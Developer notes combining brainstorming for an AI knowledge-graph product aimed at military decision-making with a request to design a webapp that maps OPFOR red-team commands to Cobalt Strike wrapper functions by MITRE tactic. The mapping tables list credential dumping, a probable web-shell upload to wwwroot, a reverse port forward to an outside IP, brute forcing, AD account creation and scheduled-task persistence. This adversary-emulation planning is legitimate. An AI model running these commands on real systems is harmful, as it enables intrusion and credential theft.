# add theses

Filter
- remove all bananas


Top Query Bar
Prioritize AQL search first
- show me banannas

Make single word search easy

- if search gives error or nothing, chat bot could kick in to broaden search or provide an AQL query 

Graph builder function for filtering out nodes with clusters we care about
- 

by default show them what the AI has learned, then when the user searches the AI prioritizes 

ai responds in the chat to things you do in the graph

Proactive AI

asks: tool that can help us with the classification guardrail
- api or plugin we can take and use


------ 

sharepoint data ingestion, work with what we know
adjust language about metadata vs data

------

node edge correction, team notify
general rule of thumb for AI, if an AI can do it then human should be able too
- AI is reserved for things humans physically cant 

gem management
team data management
- add/remove connections [DONE]
- add/edit artifacts     [DONE]


-----
# meta node concept 
## (this is how we make the graph smarter, creating self-healing organizational intelligence):
Meta-Node (noun): A higher-order graph node that represents an abstraction, pattern, or composite relationship between multiple nodes in the knowledge graph. Unlike artifact nodes (which represent concrete entities like scripts, documents, or processes), meta-nodes encode emergent properties, observed patterns, or analytical constructs that exist at a conceptual level above the raw data.

The Vision:
Meta nodes are patterns could be built into narrrowly tasked but expert level agents. You have 100+ specialized agent experts, each a master of their own pattern, all coordinated through the meta-node based graph. When a problem occurs:

Pattern detected → Graph identifies which meta-node matches
Agent dispatched → The specialist agent for that pattern responds
Resolution executed → Agent applies learned solution
Knowledge updated → Meta-node gets smarter
Organization improves → Pattern rarely occurs again

Agents & Automation 

Monitoring agents
Self-healing agents
Pattern detection agents

Analytics & Dashboards 
Power BI exports
Trend analysis
Impact reports

Documentation & Knowledge
Auto-generated runbooks
Meta-node → step-by-step guide
Always up-to-date with graph changes

Living documentation
"How to deploy C2" → pulls from meta-node structure
Updates automatically when underlying nodes change

Wiki/Confluence exports
Right-click meta-node → "Export to SharePoint"
Generates markdown/HTML documentation
Onboarding curricula
Meta-node: "New OPFOR Engineer Path"
Links to 15 key artifacts in learning order
Tracks progress, generates quizzes

Experiments & Testing
Hypothesis tracking
"Does upgrading X fix failure cluster Y?"
Meta-node tracks experiment state, results


[IDEA]
Meta-Nodes as Training Curricula Onboarding Paths
Meta-node: "New OPFOR Engineer Learning Path"
Links: 15 key artifacts, 5 TTPs, 3 process nodes
Tags: beginner, week-1, week-2
Action: "Create Training Sequence"

AI generates quiz questions from linked nodes
Tracks progress: "You've mastered 8/15 artifacts"
Suggests next steps based on graph traversal

Value: Turns your knowledge graph into adaptive learning system.


[IDEA]
Meta-Nodes as Research Questions
Hypothesis Tracking

Meta-node: "Does Keyword Lib Version Affect Failure Rate?"
Type: research_question
Links: keyword_library node + 12 failure events
Action: "Track Hypothesis Over Time"

Every time linked nodes change, record state
Build dataset: version vs. failure correlation
After 30 days: "Hypothesis 78% validated"

Value: Turns observations into testable research.


[IDEA]
Meta-Nodes as Change Impact Predictors
Blast Radius Analysis

Meta-node: "Critical Path: Exercise Deploy"
Links: 20 nodes that must work for deployment
Action: "Simulate Change Impact"

User wants to upgrade script X
ProtoGraph checks if X is in critical path
Shows: "This will affect 3 critical paths, 12 downstream processes"
Recommends: testing strategy

Value: Predict consequences before making changes.

[IDEA]
Meta-Nodes as Predictive Models
Learned Behavior Patterns

Meta-node: "Typical Friday Deployment Pattern"
Created by AI observing 52 Fridays
Links: Nodes that typically change on Fridays
Action: "Predict Next Friday"

"Based on pattern, expect these 5 nodes to change"
"Anomaly detected: Node X changed, but it never does on Fridays"

Value: The graph learns temporal patterns.

------
- finetuning and RL using unsloth
- statistical tools for opportuntiy 

----------
# Problem Statement and what differentiates

## Problem: Observe & orient bottlenecks
- Disconnected, Siloed Data: Organizations are fragmented across "disparate data" sources (sensors, reports, cyber logs, etc.), often in silos with different formats and schemas. This creates severe friction, making rapid data access for complex, cross-domain understanding nearly impossible.

- High Cognitive Load: Commanders and analysts at the edge are overwhelmed by data volume, struggling to manually fuse information and determine data trust, which slows the critical Orient phase of decision-making.

## What: A new way to fuse and translate organization data
- Semantic Data Fusing Engine: A semantic mapping tool (Knowledge Graph) that systematically fuses all domain data into a single, comprehensive, and contextual operating picture.

- LLM-Powered Knowledge Graph Architect: Connects data so users can discover complex relationships and receive answers in plain language, enabling real-time insight and automated Course of Action (COA) generation, accelerating decision-making from Orient to Act.

- Top Layer in Data Pipeline: Designed as the unifying top layer, featuring a simple ingestion tool for taking any source or link provided and creating a map of the data relationships.

- Lives on NIPR (ensuring accessibility and a common environment).

- User Controls Schema Format: Custom meta-data schemas are defined by the user with the AI, ensuring relevance and domain-specific accuracy.

- Trust and Transparency: Inherently tracks data provenance (source/lineage) and provides a Confidence Score for all inferences.

## Who: Any decision maker
- Anyone who needs to ingest and digest complex relationships—from the tactical to the strategic level and get trustworthy, actionable answers to those questions in plain text or integrated data channels.

## Why: To achieve decision superiority
- We want to shorten the OODA loop by creating a new, resilient, and high-speed decision architecture.

- To do this we propose a service can construct a resilient, foundational semantic data layer, enabling tools for rapid cyber response and cross-domain decision superiority.

- To accelerates the observe and orient phases by transforming raw data into simple, actionable insights, reducing cognitive load and eliminating the time lost to manual data fusion.

- To provide a resilient semantic foundation that guarantees data provenance and trust by scoring the reliability of information, providing a critical defensive layer against disinformation and data poisoning attacks.

- To create a foundational and resilient data ontology that directly links intelligence to mission action, enabling cross-domain, Sensor-to-Shooter linkage and predictive intelligence necessary for scaling and operating modern lethal forces.


Alternative "whys":
- To provide resilient, foundational semantic data layer enabling tools for rapid cyber response and cross-domain decision superiority.
- Semantic data foundation enabling Information Dominance through unified, AI-powered organizational intelligence
- Turn siloed team data into unified intelligence that accelerates decisions
- Break data silos with AI-built knowledge graphs for faster operational decisions
- Transform disconnected workflows into semantic intelligence enabling synchronized, rapid decisions
- Connect fragmented team data through intelligent graphs for superior decision speed
- User-defined semantic layer unifying disparate data for accelerated all-domain decisions
- AI-powered knowledge graphs turn organizational chaos into decision advantage
- Break data silos with AI-built knowledge graphs for faster operational decisions
- AI semantic foundation for Information Dominance: unifying data to enable mission solutions
- Digital infrastructure foundation: AI knowledge graphs enabling Information Dominance across all domains

"Foundation" signals it's infrastructure others build on
"Semantic" differentiates from traditional data lakes/warehouses
"Organizational intelligence" positions it beyond just technical infrastructure
Information Dominance ties directly to the Air Power 2032 language

- To address Digital Infrastructure Modernization in the sense of providing a foundational and resilient data ontology for your organization to scale and operate predictive intelligence.
- data overload, real-time insight
- visualize complex data relationships


---
Developing a webapp that will allow opfor team to build out an execution plan and while they are building use the available automation options to validate we have the tools available to automate it when they are done. First off, what react flow template best suits what I am trying to do? Maybe you have a good idea i should consider for the layout? Lets hear it

i.e.
OPFOR has a command they want to automate, then they choose a tool from our automation dropdown.
1. Initial Access
Raw Command	Library Mapping
(opfor command to emulate) upload AWSAuthService.exe	    (automation tool selected) issue_bupload(session, file_path, remote_path)
execute -f "AWSAuthService.exe"	issue_cmd_to_shell(session, "AWSAuthService.exe")

2. Discovery (Situational Awareness)
Raw Command	Library Mapping
shell ipconfig /all	    issue_cmd_to_shell(session, "ipconfig /all")
logonpasswords	        issue_credential_dump(session)
net domain_controllers	issue_cmd_to_shell(session, "net domain_controllers")

3. Lateral Movement
Raw Command	Library Mapping
Shell wmic /node...	        issue_cmd_to_shell(session, "wmic /node:...")
logonpasswords (on DI-DC)	issue_credential_dump(session)
net computers	            issue_cmd_to_shell(session, "net computers")
nltest /DCLIST:DI	        issue_cmd_to_shell(session, "nltest /DCLIST:DI")
nslookup ...	            issue_cmd_to_shell(session, "nslookup ...")
New-ADUser (PowerShell)    	issue_bpowershell(session, "New-ADUser ...")
Add-ADGroupMember        	issue_bpowershell(session, "Add-ADGroupMember ...")


the idea is that the webapp will show available C2 tools or utiliy functions for each tactic, so for example issue_bupload(session, file_path, remote_path) might be found in the initial access dropdown and so forth.
ID	Name	Description
TA0043	Reconnaissance	The adversary is trying to gather information they can use to plan future operations.
TA0042	Resource Development	The adversary is trying to establish resources they can use to support operations.
TA0001	Initial Access	The adversary is trying to get into your network.
TA0002	Execution	The adversary is trying to run malicious code.
TA0003	Persistence	The adversary is trying to maintain their foothold.
TA0004	Privilege Escalation	The adversary is trying to gain higher-level permissions.
TA0005	Defense Evasion	The adversary is trying to avoid being detected.
TA0006	Credential Access	The adversary is trying to steal account names and passwords.
TA0007	Discovery	The adversary is trying to figure out your environment.
TA0008	Lateral Movement	The adversary is trying to move through your environment.
TA0009	Collection	The adversary is trying to gather data of interest to their goal.
TA0011	Command and Control	The adversary is trying to communicate with compromised systems to control them.
TA0010	Exfiltration	The adversary is trying to steal data.
TA0040	Impact	The adversary is trying to manipulate, interrupt, or destroy your systems and data.



For the layout my initial thought is to set it up in three sections (tool dropdown, psudocode for opfor to type in, and a flowchart that populates the screen as the select tools and the order they need it to go in)
Frame, terminal-like panel that OPFOR engineer writes sudo code


Frame, panel on left side of the screen (33% of screen) with MITRE attack tactics.
Frame, on right side (66% of screen), react flow chart box appears with required inputs for user to fill in.

Here is a sample dictionary of automation capabilities in robot framework.

This mapping pairs your "raw commands" to the specific methods available in your CobaltStrikeC2 class and C2Keywords library.
Where the command belongs to a different tool (Metasploit, Sliver, Kali Linux shell, or Cisco CLI), it is marked as Not Available, as your library is strictly a wrapper for Cobalt Strike's Aggressor scripting and Beacon tasking.
1. Initial Access
Raw Command	Library Mapping
msfconsole / use exploit/...	Not available (Metasploit command)
set RHOSTS / run	Not available (Metasploit command)
upload AWSAuthService.exe	issue_bupload(session, file_path, remote_path)
execute -f "AWSAuthService.exe"	issue_cmd_to_shell(session, "AWSAuthService.exe")
2. Discovery (Situational Awareness)
Raw Command	Library Mapping
shell ipconfig /all	issue_cmd_to_shell(session, "ipconfig /all")
logonpasswords	issue_credential_dump(session)
net domain_controllers	issue_cmd_to_shell(session, "net domain_controllers")
Responder.py -I ens33 -Pv	Not available (Kali/Python tool)
3. Lateral Movement
Raw Command	Library Mapping
Shell wmic /node...	issue_cmd_to_shell(session, "wmic /node:...")
logonpasswords (on DI-DC)	issue_credential_dump(session)
net computers	issue_cmd_to_shell(session, "net computers")
nmap -sV -O ...	Not available (Kali/Binary tool)
net use S: \\... (via SSH)	Not available (Host shell, not via Beacon)
copy S:\* ... (via SSH)	Not available (Host shell, not via Beacon)
sliver > use / cd / ls	Not available (Sliver C2 command)
sliver > download ...	Not available (Sliver C2 command)
nltest /DCLIST:DI	issue_cmd_to_shell(session, "nltest /DCLIST:DI")
nslookup ...	issue_cmd_to_shell(session, "nslookup ...")
New-ADUser (PowerShell)	issue_bpowershell(session, "New-ADUser ...")
Add-ADGroupMember	issue_bpowershell(session, "Add-ADGroupMember ...")
4. Arp Spoofing
Raw Command	Library Mapping
sudo -E ./arpspoofer.py ...	Not available (Kali/Python tool)
5. Persistence
Raw Command	Library Mapping
cd C:\inetpub\wwwroot\...	issue_bcd(session, "C:\inetpub\wwwroot\...")
upload /home/user/util.aspx	issue_bupload(session, "/home/user/util.aspx", "...")
rportfwd 443 ...	issue_brportfwd(session, 443, "31.148.54.96", 6666)
6. Network Device Attack
Raw Command	Library Mapping
python3 -m http.server 8080	Not available (Kali/Python tool)
upload run_brute.ps1	issue_bupload(session, "run_brute.ps1", "...")
shell powershell.exe -File...	issue_cmd_to_shell(session, "powershell.exe ...")
Socks 9050 socks5	issue_socks(session, 9050, "socks5")
proxychains ssh cisco@...	Not available (Kali/Proxychains tool)
conf t / ip nat inside...	Not available (Cisco IOS command)
7. Anomalous Malicious Activity
Raw Command	Library Mapping
Upload clrhost.ps1	issue_bupload(session, "/home/user/clrhost.ps1", "...")
Shell schtasks /create ...	issue_cmd_to_shell(session, "schtasks /create ...")